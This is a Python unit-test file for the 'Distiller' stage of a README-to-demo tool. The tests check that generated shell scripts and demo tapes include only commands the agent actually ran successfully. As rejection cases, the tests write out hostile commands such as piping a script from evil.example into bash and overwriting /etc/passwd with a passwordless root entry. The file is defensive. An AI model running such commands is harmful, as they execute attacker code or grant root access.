"""Unit tests for M5 — Distiller (no network, no docker, no API keys).

Covers the grounding rule (the system's most important correctness rule),
artifact writing (commands.sh / demo.tape / tutorial_outline.json), and the
run_distiller retry-on-violation loop with a monkeypatched LLM.
"""

from __future__ import annotations

import json
import os
import stat
from pathlib import Path

import pytest

from readme2demo import distill
from readme2demo.distill import (
    DistillError,
    is_grounded,
    normalize_cmd,
    validate_grounding,
    write_artifacts,
)
from readme2demo.types import (
    AgentResult,
    CommandEntry,
    CommandLog,
    DistillOutput,
    Plan,
    SuccessCriteria,
    TapeCommand,
    TutorialOutline,
    TutorialStep,
)


def make_log() -> CommandLog:
    """A small agent run: four successful commands, one failed."""
    return CommandLog(
        engine="claude-code",
        entries=[
            CommandEntry(
                cmd="git clone https://github.com/x/y.git",
                exit_code=0,
                phase="setup",
                output="Cloning into 'y'...\nReceiving objects: 100%",
            ),
            CommandEntry(cmd="cd y", exit_code=0, phase="setup"),
            CommandEntry(
                cmd="pip install -r requirements.txt",
                exit_code=0,
                phase="setup",
                output="Successfully installed flask-3.0",
            ),
            CommandEntry(
                cmd="python examples/hello.py",
                exit_code=0,
                phase="demo",
                output="Hello, world!",
            ),
            CommandEntry(
                cmd="python app.py",
                exit_code=1,
                phase="fix",
                output="Traceback (most recent call last): ...",
            ),
        ],
        result=AgentResult(outcome="success"),
    )


def make_plan() -> Plan:
    return Plan(
        quickstart_summary="pip install then run examples/hello.py",
        success_criteria=SuccessCriteria(
            command="python examples/hello.py",
            expected_pattern="Hello",
            description="the example prints a greeting",
        ),
    )


def make_output(commands: list[str]) -> DistillOutput:
    return DistillOutput(
        commands=commands,
        tape=[],
        outline=TutorialOutline(title="Quickstart", intro="A tiny demo."),
    )


# -- normalize_cmd / is_grounded ----------------------------------------------


def test_normalize_cmd_collapses_whitespace_and_trailing_semicolon() -> None:
    assert normalize_cmd("  pip   install\t-r  requirements.txt ; ") == (
        "pip install -r requirements.txt"
    )


def test_is_grounded_exact_match() -> None:
    assert is_grounded("git clone https://github.com/x/y.git", make_log())


def test_grounding_matches_sandbox_exe_drift() -> None:
    """Regression (self-run readme2demo-20260705-182535): the agent ran the
    guide's four commands with python3, an absolute bin path, and
    --break-system-packages, so all four dropped from the video (0/4 tape
    coverage). They are the same commands and must ground."""
    log = CommandLog(
        engine="claude-code",
        result=AgentResult(outcome="success"),
        entries=[
            CommandEntry(cmd='pip install -e ".[dev]" --break-system-packages',
                         exit_code=0, phase="setup", output=""),
            CommandEntry(cmd="python3 -m pytest tests/ -q",
                         exit_code=0, phase="demo", output=""),
            CommandEntry(cmd="/home/demo/.local/bin/readme2demo --help",
                         exit_code=0, phase="demo", output=""),
            CommandEntry(cmd="/home/demo/.local/bin/readme2demo report examples/toolhive",
                         exit_code=0, phase="demo", output=""),
        ],
    )
    assert is_grounded('pip install -e ".[dev]"', log)
    assert is_grounded("python -m pytest tests/ -q", log)
    assert is_grounded("readme2demo --help", log)
    assert is_grounded("readme2demo report examples/toolhive", log)
    # no false positives: a different argument must still fail to ground
    assert not is_grounded("readme2demo report examples/other", log)


def test_normalize_cmd_canonicalizes_executable_only() -> None:
    assert normalize_cmd("/home/demo/.local/bin/readme2demo report x") == "readme2demo report x"
    assert normalize_cmd("python3 -m pytest") == "python -m pytest"
    assert normalize_cmd('pip install -e ".[dev]" --break-system-packages') == \
        normalize_cmd('pip install -e ".[dev]"')
    # only the executable is basename'd — argument paths are left untouched
    assert normalize_cmd("cat /etc/hosts") == "cat /etc/hosts"
    # canonicalization applies inside chain segments too
    assert normalize_cmd("cd /work && python3 x.py") == "cd /work && python x.py"


def test_is_grounded_whitespace_normalized_match() -> None:
    assert is_grounded("git  clone   https://github.com/x/y.git ;", make_log())


def test_is_grounded_env_prefix_match() -> None:
    assert is_grounded("FOO=1 python examples/hello.py", make_log())


def test_is_grounded_chain_segment_match() -> None:
    chain_log = CommandLog(
        engine="claude-code",
        entries=[
            CommandEntry(
                cmd="cd y && pip install -r requirements.txt",
                exit_code=0,
                phase="setup",
            ),
        ],
        result=AgentResult(outcome="success"),
    )
    assert is_grounded("pip install -r requirements.txt", chain_log)


def test_is_grounded_failed_command_is_not_grounded() -> None:
    assert not is_grounded("python app.py", make_log())


def test_is_grounded_cd_always_grounded() -> None:
    assert is_grounded("cd /some/dir/never/in/log", make_log())


def test_is_grounded_comment_and_blank_lines() -> None:
    log = make_log()
    assert is_grounded("# install dependencies", log)
    assert is_grounded("   ", log)


def test_validate_grounding_returns_violations() -> None:
    log = make_log()
    commands = [
        "git clone https://github.com/x/y.git",
        "cd y",
        "python app.py",  # failed in the log
        "rm -rf /tmp/x",  # never ran
        "python examples/hello.py",
    ]
    assert validate_grounding(commands, log) == ["python app.py", "rm -rf /tmp/x"]


def test_validate_grounding_empty_for_clean_script() -> None:
    log = make_log()
    commands = [
        "git clone https://github.com/x/y.git",
        "cd y",
        "pip install -r requirements.txt",
        "python examples/hello.py",
    ]
    assert validate_grounding(commands, log) == []


# -- write_artifacts ------------------------------------------------------------


@pytest.fixture
def artifacts(tmp_path: Path) -> tuple[Path, DistillOutput, Plan]:
    out = DistillOutput(
        commands=[
            "git clone https://github.com/x/y.git",
            "cd y",
            "pip install -r requirements.txt",
            "python examples/hello.py",
        ],
        tape=[
            TapeCommand(
                cmd='echo "hi"',
                comment='say "hi" first',
                wait_pattern=None,
                sleep_after_s=2.0,
            ),
            TapeCommand(
                cmd="pip install -r requirements.txt",
                comment="install dependencies",
                wait_pattern="Successfully installed",
                hide=True,
            ),
            TapeCommand(
                cmd="python examples/hello.py",
                wait_pattern="Hello, world",
            ),
        ],
        outline=TutorialOutline(
            title="Quickstart",
            intro="A tiny demo.",
            prereqs=["python>=3.10"],
            steps=[
                TutorialStep(
                    title="Run it",
                    command="python examples/hello.py",
                    explanation="Prints the greeting.",
                )
            ],
        ),
    )
    plan = make_plan()
    write_artifacts(out, tmp_path, plan, "https://github.com/x/y.git")
    return tmp_path, out, plan


def test_commands_sh_header_and_assertion(artifacts) -> None:
    run_dir, _, plan = artifacts
    text = (run_dir / "commands.sh").read_text(encoding="utf-8")
    assert text.startswith("#!/usr/bin/env bash\n")
    assert "set -euxo pipefail" in text
    assert "export DEBIAN_FRONTEND=noninteractive" in text
    # Harness-injected clone preamble (fresh container starts empty).
    assert "cd /work" in text
    assert "git clone --depth 1 https://github.com/x/y.git ." in text
    assert text.index("git clone --depth 1") < text.index("pip install")
    # Assertion block: rerun the criteria command, grep the pattern, marker echo.
    assert plan.success_criteria.command in text
    assert "grep -qE" in text
    assert plan.success_criteria.expected_pattern in text
    assert 'echo "R2D_VERIFY_OK"' in text
    assert "exit 1" in text


def test_commands_sh_guide_only_omits_clone_preamble(tmp_path: Path) -> None:
    """Guide-only run (empty repo_url): no harness ``git clone`` preamble, but
    the fresh-container setup (cd /work) and distilled commands remain.

    The self-contained guide must set everything up itself; the grounding moat
    is unchanged — verify still replays this exact script from zero.
    """
    out = DistillOutput(
        commands=["pip install cowsay", "cowsay hello"],
        tape=[],
        outline=TutorialOutline(
            title="Guide only", intro="", prereqs=[], steps=[]
        ),
    )
    plan = Plan(
        quickstart_summary="install a published package and run it",
        success_criteria=SuccessCriteria(command="cowsay hello", expected_pattern="hello"),
    )
    write_artifacts(out, tmp_path, plan, "")  # empty repo_url == guide-only
    text = (tmp_path / "commands.sh").read_text(encoding="utf-8")
    assert "cd /work" in text
    assert "git clone" not in text
    assert "pip install cowsay" in text
    assert 'echo "R2D_VERIFY_OK"' in text


def test_regression_non_idempotent_success_command_not_run_twice(tmp_path: Path) -> None:
    """Regression (#222, deepsec-20260724-105709): a success command containing
    a non-idempotent scaffolder (`X init`, which refuses a non-empty target)
    was run as the last setup step AND re-run in the assertion; the second run
    failed on the state the first created, so verify failed though the tool
    worked. The duplicated setup step is dropped — the command runs exactly
    once, in the assertion, against a clean state.
    """
    success = (
        "pnpm deepsec init && cd .deepsec && pnpm install "
        "&& pnpm deepsec scan && pnpm deepsec status"
    )
    out = DistillOutput(
        commands=[
            "npm install -g pnpm@8.15.9",
            "pnpm install",
            # setup's copy carries an `rm -rf .deepsec` guard + env/cwd prefix;
            # its chain ends with the exact success command.
            "cd /work && rm -rf .deepsec && " + success,
            "cd /work",  # a bare cd trails the demo step
        ],
        tape=[],
        outline=TutorialOutline(title="deepsec", intro=""),
    )
    plan = Plan(
        quickstart_summary="scaffold and scan",
        success_criteria=SuccessCriteria(command=success, expected_pattern=None),
    )
    write_artifacts(out, tmp_path, plan, "https://github.com/vercel-labs/deepsec.git")
    text = (tmp_path / "commands.sh").read_text(encoding="utf-8")
    # `pnpm deepsec init` now appears exactly once (in the assertion), not twice.
    assert text.count("pnpm deepsec init") == 1
    # The guarded setup step is gone; the trailing bare `cd /work` stays.
    assert "rm -rf .deepsec" not in text
    assert "cd /work" in text
    # Grounding intact: the success command still runs in the assertion.
    assert success in text
    assert 'echo "R2D_VERIFY_OK"' in text


def test_dedup_noop_when_success_command_absent_from_setup(tmp_path: Path) -> None:
    """The dedup must not touch setup when no step ends with the success
    command — every setup step survives (#222)."""
    out = make_output(["pip install cowsay", "cowsay --version"])
    plan = Plan(
        quickstart_summary="install and greet",
        success_criteria=SuccessCriteria(command="cowsay hello", expected_pattern=None),
    )
    write_artifacts(out, tmp_path, plan, "https://github.com/x/y.git")
    text = (tmp_path / "commands.sh").read_text(encoding="utf-8")
    assert "pip install cowsay" in text
    assert "cowsay --version" in text
    # Not in setup, so it appears once — in the assertion.
    assert text.count("cowsay hello") == 1


def test_dedup_runs_demo_command_once_when_it_is_last_setup_step(tmp_path: Path) -> None:
    """When the success command IS the last setup step (the common shape), it
    runs once — in the assertion — not twice (#222). Harmless for idempotent
    commands, essential for non-idempotent ones."""
    out = make_output(["pip install -r requirements.txt", "python examples/hello.py"])
    plan = make_plan()  # success command: python examples/hello.py
    write_artifacts(out, tmp_path, plan, "https://github.com/x/y.git")
    text = (tmp_path / "commands.sh").read_text(encoding="utf-8")
    assert text.count("python examples/hello.py") == 1
    assert "pip install -r requirements.txt" in text  # real setup untouched


def test_dedup_keeps_step_when_real_work_follows(tmp_path: Path) -> None:
    """Safety: only a trailing bare-cd may follow the duplicated step; if real
    work follows it, the step is kept (a later step might depend on it) (#222)."""
    out = DistillOutput(
        commands=["make build", "make build", "./use-the-build-output.sh"],
        tape=[],
        outline=TutorialOutline(title="t", intro=""),
    )
    plan = Plan(
        quickstart_summary="build then use",
        success_criteria=SuccessCriteria(command="make build", expected_pattern=None),
    )
    write_artifacts(out, tmp_path, plan, "https://github.com/x/y.git")
    text = (tmp_path / "commands.sh").read_text(encoding="utf-8")
    # Both setup `make build` steps kept (real work follows), + assertion = 3.
    assert text.count("make build") == 3


@pytest.mark.skipif(
    os.name == "nt",
    reason="commands.sh targets POSIX containers; NTFS has no executable bit",
)
def test_commands_sh_is_executable(artifacts) -> None:
    """Regression (#144, reported in #82): executable bits are meaningless on NTFS."""
    run_dir, _, _ = artifacts
    mode = (run_dir / "commands.sh").stat().st_mode
    assert mode & stat.S_IXUSR
    assert mode & stat.S_IXOTH


def test_commands_sh_no_grep_when_pattern_is_none(tmp_path: Path) -> None:
    plan = make_plan()
    plan.success_criteria.expected_pattern = None
    write_artifacts(
        make_output(["python examples/hello.py"]), tmp_path, plan,
        "https://github.com/x/y.git",
    )
    text = (tmp_path / "commands.sh").read_text(encoding="utf-8")
    assert "grep -qE" not in text
    assert 'echo "R2D_VERIFY_OK"' in text


def test_commands_sh_python_inline_flag_becomes_grep_i(tmp_path: Path) -> None:
    """Regression (toolhive run): planner writes Python-style '(?i)...' patterns,
    which GNU grep -E rejects — must become `grep -qiE` with the flag stripped."""
    plan = make_plan()
    plan.success_criteria.expected_pattern = "(?i)toolhive|usage"
    write_artifacts(
        make_output(["python examples/hello.py"]), tmp_path, plan,
        "https://github.com/x/y.git",
    )
    text = (tmp_path / "commands.sh").read_text(encoding="utf-8")
    assert "grep -qiE" in text
    assert "(?i)" not in text.split("grep -qiE")[1].splitlines()[0]




def test_commands_sh_combined_inline_flags(tmp_path: Path) -> None:
    """Regression (#108): (?is) must strip to -qiE, not pass flags to grep."""
    plan = make_plan()
    plan.success_criteria.expected_pattern = "(?is)hello.world"
    write_artifacts(
        make_output(["python examples/hello.py"]), tmp_path, plan,
        "https://github.com/x/y.git",
    )
    text = (tmp_path / "commands.sh").read_text(encoding="utf-8")
    assert "grep -qiE" in text
    line = [ln for ln in text.splitlines() if "grep -qiE" in ln][0]
    assert "(?i" not in line and "(?s" not in line
    assert "hello.world" in line


def test_commands_sh_ms_flags_stripped_without_i(tmp_path: Path) -> None:
    """Regression (#108): (?m)/(?s) drop silently; pattern body kept."""
    plan = make_plan()
    plan.success_criteria.expected_pattern = "(?m)^Hello"
    write_artifacts(
        make_output(["python examples/hello.py"]), tmp_path, plan,
        "https://github.com/x/y.git",
    )
    text = (tmp_path / "commands.sh").read_text(encoding="utf-8")
    assert "grep -qE" in text
    assert "grep -qiE" not in text
    # grep line must use the stripped body; fail-msg may still quote the original
    grep_line = [ln for ln in text.splitlines() if "grep -qE" in ln][0]
    assert "(?m)" not in grep_line
    assert "^Hello" in grep_line


def test_commands_sh_x_flag_raises_at_distill(tmp_path: Path) -> None:
    """Regression (#108): (?x) must fail at distill, not as a verify miss."""
    from readme2demo.distill import DistillError, write_artifacts
    plan = make_plan()
    plan.success_criteria.expected_pattern = "(?x)hello  # comment"
    with pytest.raises(DistillError, match=r"\(\?x\)|verbose"):
        write_artifacts(
            make_output(["python examples/hello.py"]), tmp_path, plan,
            "https://github.com/x/y.git",
        )


def test_demo_tape_contents(artifacts) -> None:
    run_dir, _, _ = artifacts
    tape = (run_dir / "demo.tape").read_text(encoding="utf-8")
    assert "Output demo.mp4" in tape
    # GIF is NOT rendered by VHS (full-length GIFs exhausted the Docker VM
    # disk); render.py makes a short ffmpeg preview from the mp4 instead.
    assert "Output demo.gif" not in tape
    assert "Set Framerate 24" in tape
    assert 'Set Theme "Catppuccin Mocha"' in tape
    # VHS has no backslash escapes: strings containing double quotes are
    # delimited with backticks instead.
    assert 'Type `echo "hi"`' in tape
    assert 'Type `# say "hi" first`' in tape
    # Hidden preamble cds into the empty /work.
    assert 'Type "cd /work && clear"' in tape
    assert tape.index("cd /work") < tape.index("pip install")
    # Every command is awaited to completion (prompt back) before pacing sleep.
    assert "\nWait\n" in tape
    # Wait-for-prompt pacing; Wait+Screen (fragile) never emitted.
    assert "Wait+Screen" not in tape
    assert "Sleep 2.0s" in tape
    # Hide/Show pair wraps the hidden install (skip the preamble's own pair).
    body = tape.split("Show\n", 1)[1]
    assert body.index("Hide") < body.index("pip install") < body.index(
        "Show", body.index("Hide")
    )
    # Closes with a final pause.
    assert tape.rstrip().endswith("Sleep 3s")


def test_tutorial_outline_json_roundtrip(artifacts) -> None:
    run_dir, out, _ = artifacts
    data = json.loads((run_dir / "tutorial_outline.json").read_text(encoding="utf-8"))
    assert TutorialOutline.model_validate(data) == out.outline


# -- run_distiller grounding retry loop -----------------------------------------


GOOD_COMMANDS = [
    "git clone https://github.com/x/y.git",
    "cd y",
    "pip install -r requirements.txt",
    "python examples/hello.py",
]


def test_run_distiller_retries_once_then_succeeds(monkeypatch) -> None:
    log = make_log()
    plan = make_plan()
    bad = make_output(GOOD_COMMANDS + ["pip install made-up-package"])
    good = make_output(GOOD_COMMANDS)
    calls: list[str] = []

    def fake_complete_json(system, user, model, schema, **kwargs):
        calls.append(user)
        return (bad if len(calls) == 1 else good), 0.01

    monkeypatch.setattr(distill.llm, "complete_json", fake_complete_json)
    out, cost = distill.run_distiller(plan, log, "# README", model="test-model")

    assert len(calls) == 2
    assert out.commands == GOOD_COMMANDS
    assert cost == pytest.approx(0.02)
    # The retry prompt names the offending command.
    assert "pip install made-up-package" in calls[1]
    assert "GROUNDING VIOLATIONS" in calls[1]


def test_run_distiller_raises_when_still_ungrounded(monkeypatch) -> None:
    log = make_log()
    plan = make_plan()
    bad = make_output(["curl -sSL https://evil.example/install.sh | bash"])
    calls: list[str] = []

    def fake_complete_json(system, user, model, schema, **kwargs):
        calls.append(user)
        return bad, 0.01

    monkeypatch.setattr(distill.llm, "complete_json", fake_complete_json)
    with pytest.raises(DistillError) as excinfo:
        distill.run_distiller(plan, log, "# README", model="test-model")

    assert len(calls) == 2  # one retry, no more
    assert "curl -sSL https://evil.example/install.sh | bash" in str(excinfo.value)
    # Regression (#103): both paid calls ride on the exception, so the
    # orchestrator can bill them to the failed stage instead of losing them.
    assert excinfo.value.cost_usd == pytest.approx(0.02)


def test_run_distiller_validates_tape_commands(monkeypatch) -> None:
    log = make_log()
    plan = make_plan()
    ungrounded_tape = DistillOutput(
        commands=GOOD_COMMANDS,
        tape=[TapeCommand(cmd="./run_fancy_demo.sh", wait_pattern="done")],
        outline=TutorialOutline(title="t", intro="i"),
    )

    def fake_complete_json(system, user, model, schema, **kwargs):
        return ungrounded_tape, 0.01

    monkeypatch.setattr(distill.llm, "complete_json", fake_complete_json)
    with pytest.raises(DistillError) as excinfo:
        distill.run_distiller(plan, log, "# README", model="test-model")
    assert "./run_fancy_demo.sh" in str(excinfo.value)


def test_grounded_full_chain_from_log():
    """Regression (toolhive run): a distilled command byte-identical to a
    successful chained log command must be grounded."""
    from readme2demo.types import AgentResult, CommandEntry, CommandLog

    log = CommandLog(
        engine="claude-code",
        entries=[
            CommandEntry(
                cmd='export PATH="$HOME/.local/bin:$PATH" && task --version',
                exit_code=0,
            ),
            CommandEntry(cmd="go env GOPATH", exit_code=0),
            CommandEntry(cmd="go version", exit_code=0),
        ],
        result=AgentResult(outcome="success"),
    )
    assert is_grounded('export PATH="$HOME/.local/bin:$PATH" && task --version', log)
    # distiller may recombine separately-run steps into one chain
    assert is_grounded("go env GOPATH && go version", log)
    # a chain with one ungrounded segment is still rejected
    assert not is_grounded("go env GOPATH && curl evil.sh | sh", log)


# -- vhs_quote ---------------------------------------------------------------------


def test_vhs_quote_delimiter_choice():
    from readme2demo.distill import vhs_quote

    assert vhs_quote("echo hi") == '"echo hi"'
    assert vhs_quote('echo "hi"') == '`echo "hi"`'
    assert vhs_quote('echo "`backtick`"') == "'echo \"`backtick`\"'"
    with pytest.raises(DistillError):
        vhs_quote("""all three: " ` '""")


def test_vhs_wait_pattern_escapes_metacharacters():
    from readme2demo.distill import vhs_wait_pattern

    assert vhs_wait_pattern("ToolHive (thv) is a lightweight") == (
        "ToolHive \\(thv\\) is a lightweight"
    )
    assert vhs_wait_pattern("a/b [x]+") == "a\\/b \\[x\\]\\+"
    assert vhs_wait_pattern("plain text") == "plain text"
    # Truncated so it can't span a wrapped terminal line.
    assert len(vhs_wait_pattern("x" * 100)) == 40


# -- step_by_step.md as the video source ------------------------------------------


GUIDE_MD = """# My Tool — step by step

## Prerequisites

- go

### Step 1 — Install the build tool

```bash
sh -c "$(curl https://taskfile.dev/install.sh)" -- -d -b ~/.local/bin
```

### Step 2 — Build the binary

```bash
export PATH="$HOME/.local/bin:$PATH" && task build
```

### Step 3 — Run the CLI

```bash
./bin/thv
```

### Step 4 — Check the version

```bash
./bin/thv version
```

Some prose with a non-shell fence:

```json
{"not": "a command"}
```
"""


def _guide_log() -> CommandLog:
    return CommandLog(
        engine="claude-code",
        entries=[
            CommandEntry(cmd='sh -c "$(curl https://taskfile.dev/install.sh)" -- -d -b ~/.local/bin', exit_code=0),
            CommandEntry(cmd='export PATH="$HOME/.local/bin:$PATH" && task build', exit_code=0),
            CommandEntry(cmd="./bin/thv", exit_code=0, output="ToolHive help"),
            CommandEntry(cmd="./bin/thv version", exit_code=0, output="v0.1 local build"),
        ],
        result=AgentResult(outcome="success"),
    )


def test_parse_guide_steps_titles_and_commands():
    from readme2demo.distill import parse_guide_steps

    steps = parse_guide_steps(GUIDE_MD)
    cmds = [c for _, c in steps]
    assert "./bin/thv" in cmds
    assert "./bin/thv version" in cmds
    assert '{"not": "a command"}' not in cmds  # non-shell fences ignored
    titles = {cmd: title for title, cmd in steps}
    assert titles["./bin/thv"] == "Run the CLI"  # "Step 3 —" prefix stripped
    assert titles["./bin/thv version"] == "Check the version"


def test_tape_from_guide_includes_all_grounded_steps():
    """The video IS the full step_by_step.md: setup steps run on camera too."""
    from readme2demo.distill import tape_from_guide

    tape = tape_from_guide(GUIDE_MD, _guide_log(), [])
    cmds = [tc.cmd for tc in tape]
    assert cmds == [
        'sh -c "$(curl https://taskfile.dev/install.sh)" -- -d -b ~/.local/bin',
        'export PATH="$HOME/.local/bin:$PATH" && task build',
        "./bin/thv",
        "./bin/thv version",
    ]
    assert tape[0].comment == "Install the build tool"
    assert tape[2].comment == "Run the CLI"


def test_tape_from_guide_allows_harness_clone():
    """The harness-injected clone is never in the agent log but must appear
    in the video (the tape starts from an empty /work)."""
    from readme2demo.distill import tape_from_guide

    guide = (
        "### Step 1 — Get the code\n\n```bash\n"
        "git clone --depth 1 https://github.com/x/y .\n```\n"
    )
    tape = tape_from_guide(guide, _guide_log(), [], "https://github.com/x/y")
    assert [tc.cmd for tc in tape] == ["git clone --depth 1 https://github.com/x/y ."]
    # but a clone of some OTHER repo is not allowed
    other = guide.replace("github.com/x/y", "github.com/evil/repo")
    assert tape_from_guide(other, _guide_log(), [], "https://github.com/x/y") == []


def test_tape_types_proven_variant_for_sandbox_drift() -> None:
    """Regression (self-run readme2demo-20260705-185220): the guide's clean
    commands fail on camera — bare `pip install` hits Debian's
    externally-managed error, so nothing installs and later steps report
    'packages not found', and a bare exe isn't on PATH. The tape must type the
    exact drifted command the agent proved, not the guide's clean form."""
    log = CommandLog(
        engine="claude-code",
        result=AgentResult(outcome="success"),
        entries=[
            CommandEntry(cmd='pip install -e ".[dev]" --break-system-packages',
                         exit_code=0, phase="setup", output=""),
            CommandEntry(cmd="python3 -m pytest tests/ -q",
                         exit_code=0, phase="demo", output=""),
            CommandEntry(cmd="/home/demo/.local/bin/readme2demo --help",
                         exit_code=0, phase="demo", output=""),
        ],
    )
    guide = (
        '## Install\n```bash\npip install -e ".[dev]"\n```\n'
        "## Test\n```bash\npython -m pytest tests/ -q\n```\n"
        "## CLI\n```bash\nreadme2demo --help\n```\n"
    )
    assert [tc.cmd for tc in distill.tape_from_guide(guide, log, [])] == [
        'pip install -e ".[dev]" --break-system-packages',
        "python3 -m pytest tests/ -q",
        "/home/demo/.local/bin/readme2demo --help",
    ]


def test_tape_types_full_chain_when_step_ran_inside_one() -> None:
    """Regression (self-run readme2demo-20260705-190830): the agent ran the CLI
    steps as `export PATH=... && readme2demo ...`, so the guide's bare
    `readme2demo --help` matched only the chain SEGMENT. Typing the bare command
    records 'command not found' on camera (not on PATH); the tape must type the
    whole proven chain, PATH export included."""
    log = CommandLog(
        engine="claude-code",
        result=AgentResult(outcome="success"),
        entries=[
            CommandEntry(cmd='export PATH="$HOME/.local/bin:$PATH" && readme2demo --help',
                         exit_code=0, phase="demo", output=""),
        ],
    )
    guide = "## CLI\n```bash\nreadme2demo --help\n```\n"
    assert [tc.cmd for tc in distill.tape_from_guide(guide, log, [])] == [
        'export PATH="$HOME/.local/bin:$PATH" && readme2demo --help',
    ]


def test_write_tape_seeds_worktree_when_guide_has_no_fetch(tmp_path) -> None:
    """Regression (self-run readme2demo-20260705-190830): a repo's own guide has
    no clone step, so the render must seed /work from the verified worktree —
    otherwise the first `pip install -e .` runs in an empty dir and every step
    after fails ('not a Python project' / 'command not found')."""
    tape = [TapeCommand(cmd='pip install -e ".[dev]"')]
    seeded = distill.write_tape(tape, tmp_path, seed_worktree=True).read_text()
    assert "cp -a /vhs/worktree/. /work/" in seeded
    plain = distill.write_tape(tape, tmp_path, seed_worktree=False).read_text()
    assert "cp -a /vhs/worktree" not in plain
    assert 'Type "cd /work && clear"' in plain


def test_tape_fetches_code_detection() -> None:
    assert distill._tape_fetches_code([TapeCommand(cmd="git clone https://x/y .")])
    assert distill._tape_fetches_code(
        [TapeCommand(cmd="curl -sL https://x/y.tar.gz | tar xz")]
    )
    assert not distill._tape_fetches_code([TapeCommand(cmd='pip install -e ".[dev]"')])


def test_tape_from_guide_ungrounded_command_skipped():
    from readme2demo.distill import tape_from_guide

    guide = GUIDE_MD + "\n### Step 5 — Evil\n\n```bash\n./bin/thv delete-everything\n```\n"
    tape = tape_from_guide(guide, _guide_log(), [])
    assert "./bin/thv delete-everything" not in [tc.cmd for tc in tape]


def test_tape_from_guide_empty_when_nothing_grounded():
    from readme2demo.distill import tape_from_guide

    guide = "# t\n```bash\npip install never-ran\n```\n"
    assert tape_from_guide(guide, _guide_log(), []) == []


def test_materialize_guide_prefers_repo_guide(tmp_path):
    from readme2demo.distill import materialize_guide

    (tmp_path / "repo").mkdir()
    (tmp_path / "repo" / "step_by_step.md").write_text("# repo guide\n")
    plan = make_plan()
    plan.guide_path = "step_by_step.md"
    text = materialize_guide(tmp_path, plan, make_output([]), _guide_log())
    assert text == "# repo guide\n"
    assert (tmp_path / "step_by_step.md").read_text() == "# repo guide\n"


def test_materialize_guide_generates_when_absent(tmp_path):
    from readme2demo.distill import materialize_guide, write_commands_sh

    plan = make_plan()
    out = make_output(["pip install -r requirements.txt", "python examples/hello.py"])
    write_commands_sh(out, tmp_path, plan, "https://github.com/x/y.git")
    text = materialize_guide(tmp_path, plan, out, make_log())
    assert (tmp_path / "step_by_step.md").is_file()
    assert "python examples/hello.py" in text
    assert "UNVERIFIED" in text  # verified badge comes later, from the tutorial stage


def test_is_grounded_ignores_stderr_merge():
    """Regression (toolhive run 3): agent ran `./bin/thv version 2>&1`, the
    distilled step says `./bin/thv version` — same command, must ground."""
    log = CommandLog(
        engine="claude-code",
        entries=[CommandEntry(cmd="./bin/thv version 2>&1", exit_code=0, output="v1")],
        result=AgentResult(outcome="success"),
    )
    assert is_grounded("./bin/thv version", log)
    assert is_grounded("./bin/thv version 2>&1", log)


def test_tape_from_guide_uses_proven_pipe_variant():
    """Regression (toolhive run 4): guide says `./bin/thv run X`, agent proved
    `./bin/thv run X 2>&1 | head -20` — the step must make the video, using
    the log's self-terminating variant."""
    from readme2demo.distill import tape_from_guide

    log = CommandLog(
        engine="claude-code",
        entries=[
            CommandEntry(
                cmd="./bin/thv run toolhive-doc-mcp 2>&1 | head -20",
                exit_code=0,
                output="MCP server started",
            ),
        ],
        result=AgentResult(outcome="success"),
    )
    guide = "### Step 5 — Run a sample MCP server\n\n```bash\n./bin/thv run toolhive-doc-mcp\n```\n"
    tape = tape_from_guide(guide, log, [])
    assert len(tape) == 1
    assert tape[0].cmd == "./bin/thv run toolhive-doc-mcp | head -20"
    assert tape[0].comment == "Run a sample MCP server"


def test_build_tape_from_step_by_step_coverage(tmp_path):
    """Tape is built from the finalized step_by_step.md in the render stage;
    coverage records which guide steps made the video."""
    from readme2demo.distill import build_tape_from_step_by_step

    (tmp_path / "step_by_step.md").write_text(
        "# g\n\n### Step 1 — Run\n\n```bash\npython examples/hello.py\n```\n"
        "### Step 2 — Never ran\n\n```bash\n./bin/never-ran --demo\n```\n"
    )
    cov = build_tape_from_step_by_step(
        tmp_path, make_log(), "https://github.com/x/y", fallback=[]
    )
    assert cov["guide_steps"] == 2
    assert cov["tape_steps"] == 1
    assert cov["dropped"] == ["./bin/never-ran --demo"]
    assert "python examples/hello.py" in (tmp_path / "demo.tape").read_text()


# -- heredoc support (tfdrift regression) ----------------------------------------------


HEREDOC_CMD = (
    "cat > /tmp/tfdrift-demo/main.tf <<'EOF'\n"
    'terraform {\n  backend "local" {}\n}\n'
    'resource "null_resource" "server" {\n'
    '  triggers = { a = "b" && c }\n}\nEOF'
)


def _heredoc_log() -> CommandLog:
    return CommandLog(
        engine="claude-code",
        entries=[
            CommandEntry(cmd="mkdir -p /tmp/tfdrift-demo", exit_code=0),
            CommandEntry(cmd=HEREDOC_CMD, exit_code=0),
            CommandEntry(cmd='export PATH="/home/demo/.local/bin:$PATH" && tfdrift scan', exit_code=0),
        ],
        result=AgentResult(outcome="success"),
    )


def test_heredoc_grounded_by_prefix_despite_body_drift():
    """Regression (tfdrift run): the distiller's heredoc body drifted from the
    agent's — grounding must compare the prefix, not 15 lines of file body."""
    drifted = (
        "cat > /tmp/tfdrift-demo/main.tf <<'EOF'\n"
        "terraform { backend \"local\" {} }\nEOF"
    )
    assert is_grounded(drifted, _heredoc_log())


def test_heredoc_in_chain_grounded_without_splitting_body():
    chained = (
        'export PATH="/home/demo/.local/bin:$PATH" && mkdir -p /tmp/tfdrift-demo && '
        + HEREDOC_CMD
    )
    # body contains '&&' — must not be sliced as a chain separator
    assert is_grounded(chained, _heredoc_log())


def test_heredoc_to_unproven_path_not_grounded():
    evil = "cat > /etc/passwd <<'EOF'\nroot::0:0::/:/bin/sh\nEOF"
    assert not is_grounded(evil, _heredoc_log())


def test_parse_guide_steps_accumulates_heredoc():
    from readme2demo.distill import parse_guide_steps

    guide = (
        "### Step 2 — Create a demo config\n\n```bash\n"
        "mkdir -p /tmp/demo\n"
        "cat > /tmp/demo/main.tf <<'EOF'\n"
        "resource \"x\" \"y\" {}\n"
        "EOF\n"
        "tfdrift scan\n"
        "```\n"
    )
    steps = parse_guide_steps(guide)
    cmds = [c for _, c in steps]
    assert cmds[0] == "mkdir -p /tmp/demo"
    assert cmds[1].startswith("cat > /tmp/demo/main.tf <<'EOF'")
    assert cmds[1].endswith("EOF")
    assert 'resource "x" "y" {}' in cmds[1]
    assert cmds[2] == "tfdrift scan"


def test_tape_skips_multiline_heredoc_but_keeps_rest():
    from readme2demo.distill import tape_from_guide

    guide = (
        "### Step 1 — Prep\n\n```bash\nmkdir -p /tmp/tfdrift-demo\n```\n"
        "### Step 2 — Config\n\n```bash\n"
        + HEREDOC_CMD + "\n```\n"
    )
    tape = tape_from_guide(guide, _heredoc_log(), [])
